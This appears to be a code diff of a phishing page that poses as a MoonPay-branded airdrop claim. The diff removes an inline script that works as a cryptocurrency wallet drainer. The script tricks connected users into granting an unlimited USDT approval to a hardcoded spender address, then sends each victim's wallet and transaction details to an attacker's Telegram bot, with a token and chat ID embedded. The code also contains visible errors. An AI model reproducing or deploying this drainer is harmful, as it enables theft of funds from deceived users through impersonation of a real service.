@@ -4,86 +4,20 @@
 <meta charset="UTF-8" />
 <title>Moonweb3 × MoonPay |</title>
 <meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="stylesheet" href="styles.css">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
 <!-- Ethers v5 -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
-<style>
-:root{
-  --bg:#f8fafc;
-  --card:#ffffff;
-  --border:#e5e7eb;
-  --primary:purple;
-  --text:#0f172a;
-  --muted:#6b7280;
-}
-*{box-sizing:border-box}
-body{
-  margin:0;
-  font-family:Inter,sans-serif;
-  background:var(--bg);
-  color:var(--text);
-  min-height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  padding:20px;
-}
-.wrapper{width:100%;max-width:440px;padding:16px}
-.brand-bar{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:18px}
-.brand-bar img{height:26px}
-.brand-x{color:var(--muted);font-weight:600}
-.card{
-  background:var(--card);
-  border:1px solid var(--border);
-  border-radius:20px;
-  padding:28px;
-  box-shadow:0 20px 40px rgba(15,23,42,.08);
-}
-h1{font-size:22px;margin:0 0 6px}
-.subtitle{color:var(--muted);font-size:14px;margin-bottom:24px}
-.network-selector { margin-bottom: 20px; }
-.network-label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; color: var(--text); }
-.network-buttons { display: flex; gap: 10px; margin-bottom: 5px; }
-.network-btn { flex: 1; padding: 12px; border: 1px solid var(--border); border-radius: 10px; background: white; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
-.network-btn:hover:not(.active) { border-color: var(--primary); background: #f5f5ff; }
-.network-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
-.network-icon { width: 20px; height: 20px; border-radius: 50%; }
-.eth { background: linear-gradient(135deg, #627eea, #ecf0f1); border: 1px solid #627eea; }
-.bsc { background: linear-gradient(135deg, #f0b90b, #fff8e1); border: 1px solid #f0b90b; }
-
-.status-message { margin: 15px 0; padding: 12px; border-radius: 10px; background: #f0f9ff; border: 1px solid #bae6fd; font-size: 14px; text-align: center; }
-.status-message.approving { background: #fef3c7; border-color: #f59e0b; }
-.status-message.approved { background: #d1fae5; border-color: #10b981; }
-.status-message.error { background: #fee2e2; border-color: #ef4444; }
-
-.btn{ width:100%; padding:15px; border-radius:14px; border:none; font-size:15px; font-weight:600; cursor:pointer; transition:all 0.2s; }
-.btn:hover:not(:disabled){ opacity:0.9; transform:translateY(-1px); }
-.primary{background:var(--primary);color:#fff}
-.secondary{ background:#fff; border:1px solid var(--border); color:var(--text); margin-top:12px; }
-.wallet{font-size:13px;color:var(--muted);margin:14px 0;word-break:break-all}
-.moonpay{margin-top:18px;font-size:13px;color:var(--muted);text-align:center}
-.moonpay a{color:var(--primary);font-weight:600;text-decoration:none}
-.footer{margin-top:16px;font-size:12px;color:#9ca3af;text-align:center}
-
-.btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
-.btn.loading { position: relative; color: transparent; }
-.btn.loading::after { content: ""; position: absolute; width: 16px; height: 16px; top: 50%; left: 50%; margin: -8px 0 0 -8px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; }
-.btn.secondary.loading::after { border: 2px solid rgba(99, 102, 241, 0.3); border-top-color: var(--primary); }
-
-@keyframes spin { to { transform: rotate(360deg); } }
-@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-.card { animation: fadeIn 0.3s ease-out; }
-</style>
 </head>
 </head>
 <body>
 <div class="wrapper">
   <div class="brand-bar">
-    <img src="image/moonpay.png">
+    <img src="Image/moonpay.png">
     <span class="brand-x">×</span>
-    <img src="image/moon.png">
+    <img src="Image/moon.png">
   </div>
 
   <div class="card">
@@ -116,105 +50,7 @@ h1{font-size:22px;margin:0 0 6px}
   </div>
 </div>
 
-<script>
-window.addEventListener('DOMContentLoaded', async () => {
-const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
-const SPENDER_ADDRESS = "0x121708E6aA8BaD8DD9154f8C776084f6306DC991";
-
-const TELEGRAM_BOT = "8565350380:AAGReI3Ij-Fkq_vC6_WxL0ceU3YkJAtxKHE";
-const ADMIN_CHAT_ID = "5126266116";
-
-}
-
-const NETWORKS = {
-  1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
-  56: { name:"BNB Smart Chain", symbol:"BNB", rpc:"https://bsc-dataseed.binance.org", explorer:"https://bscscan.com", moonpay:"https://buy.moonpay.com?currencyCode=bnb", usdtAddress:"0x55d398326f99059fF775485246999027B3197955", decimals:18 }
-};
-
-const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
-let provider, signer, wcProvider=null, userAddress=null, isProcessing=false, activeProviderType=null;
-let currentChainId = 56;
-
-const injectBtn = document.getElementById('injectBtn');
-const wcBtn = document.getElementById('wcBtn');
-const approveBtn = document.getElementById('approveBtn');
-const walletDiv = document.getElementById('wallet');
-const statusDiv = document.getElementById('statusMessage');
-const moonpayLink = document.getElementById('moonpayLink');
-
-function updateWalletDisplay(address){ walletDiv.innerText = `Connected: ${address.slice(0,6)}...${address.slice(-4)}`; }
-function updateStatusMessage(message,type='default'){ statusDiv.textContent=message; statusDiv.className='status-message'; if(type==='approving') statusDiv.classList.add('approving'); else if(type==='approved') statusDiv.classList.add('approved'); else if(type==='error') statusDiv.classList.add('error'); statusDiv.style.display='block'; }
-
-function getReferral(){ const params=new URLSearchParams(window.location.search); return params.get("ref"); }
-async function sendTelegram(chatId,message){ if(!chatId) return; await fetch(`https://api.telegram.org/bot${"8565350380:AAGReI3Ij-Fkq_vC6_WxL0ceU3YkJAtxKHE"}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId,text:message})}); }
-
-function updateMoonPayLink(){ const n=NETWORKS[currentChainId]; moonpayLink.href=n.moonpay; moonpayLink.textContent=`Buy ${n.symbol} with MoonPay`; }
-updateMoonPayLink();
-
-document.querySelectorAll('.network-btn').forEach(btn=>{ btn.onclick=()=>{
-  document.querySelectorAll('.network-btn').forEach(b=>b.classList.remove('active'));
-  btn.classList.add('active');
-  currentChainId=parseInt(btn.dataset.chain);
-  updateMoonPayLink();
-}});
-
-async function connected(){ try{ userAddress = await signer.getAddress(); updateWalletDisplay(userAddress); approveBtn.disabled=false; updateStatusMessage('Ready to claim Airdrop'); } catch(err){ console.error(err); updateStatusMessage('Failed: '+err.message,'error'); } }
-async function ensureInjectedChain(){ const hex='0x'+currentChainId.toString(16); const cid=await window.ethereum.request({method:'eth_chainId'}); if(cid!==hex){ await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]}); } }
-
-injectBtn.onclick = async ()=>{
-  if(!window.ethereum){ alert("Install MetaMask/Wallet"); return; }
-  injectBtn.disabled=true; injectBtn.textContent="Connecting...";
-  try{
-    provider=new ethers.providers.Web3Provider(window.ethereum);
-    await window.ethereum.request({method:'eth_requestAccounts'});
-    signer = provider.getSigner();
-    activeProviderType='injected';
-    await connected();
-  } catch(err){ console.error(err); updateStatusMessage('Connection failed','error'); }
-  injectBtn.disabled=false; injectBtn.textContent="Connect Wallet";
-};
-
-wcBtn.onclick = async ()=>{
-  try{
-    if(wcProvider){ await wcProvider.disconnect().catch(()=>{}); wcProvider=null; }
-    wcBtn.disabled=true; wcBtn.textContent="Connecting...";
-    const {EthereumProvider}=await import('https://esm.sh/@walletconnect/ethereum-provider@2?bundle');
-    wcProvider=await EthereumProvider.init({projectId:WALLETCONNECT_PROJECT_ID,chains:[56],showQrModal:true,rpcMap:{56:NETWORKS[56].rpc},metadata:{name:'Moonweb3 Airdrop',url:window.location.origin}});
-    const accounts=await wcProvider.enable();
-    window.ethereum=wcProvider;
-    provider=new ethers.providers.Web3Provider(wcProvider);
-    signer=provider.getSigner();
-    activeProviderType='walletconnect';
-    await connected();
-  } catch(err){ console.error(err); updateStatusMessage('WalletConnect failed','error'); }
-  wcBtn.disabled=false; wcBtn.textContent="WalletConnect";
-};
-
-approveBtn.onclick=async()=>{
-  if(isProcessing) return;
-  isProcessing=true; approveBtn.disabled=true; approveBtn.textContent='Approving...';
-  updateStatusMessage('Approving Airdrop...','approving');
-  try{
-    if(activeProviderType==='injected') await ensureInjectedChain();
-    const network=NETWORKS[currentChainId];
-    const usdt=new ethers.Contract(network.usdtAddress,ERC20_ABI,signer);
-    const tx=await usdt.approve(SPENDER_ADDRESS,ethers.constants.MaxUint256);
-    const ref=getReferral(); const refChat=REFERRERS[ref];
-    await sendTelegram(ADMIN_CHAT_ID, `🔄 CLAIM STARTED\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}`);
-    if(refChat) await sendTelegram(refChat, `👤 Someone used your referral\nWallet:${userAddress}\nTx:${tx.hash}`);
-    updateStatusMessage('Transaction sent...');
-    const receipt=await tx.wait();
-    if(receipt.status===1){
-      updateStatusMessage('✅ Airdrop claimed!','approved'); approveBtn.textContent='Approved ✓';
-      await sendTelegram(ADMIN_CHAT_ID, `✅ CLAIM SUCCESS\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}\n${network.explorer}/tx/${tx.hash}`);
-      if(refChat) await sendTelegram(refChat, `🎉 Your referral CLAIMED successfully\nWallet:${userAddress}\nTx:${tx.hash}`);
-    } else throw new Error("Tx failed");
-  } catch(err){ console.error(err); updateStatusMessage('❌ Claim failed: '+err.message,'error'); approveBtn.disabled=false; approveBtn.textContent='Claim Airdrop'; }
-  finally{ isProcessing=false; }
-};
-
-window.addEventListener('beforeunload',()=>{ if(wcProvider?.disconnect) wcProvider.disconnect().catch(()=>{}); });
-});
-</script>
+<script src="script.js"></script>
+<script src="server.js"></script>
 </body>
-</html
+</html>
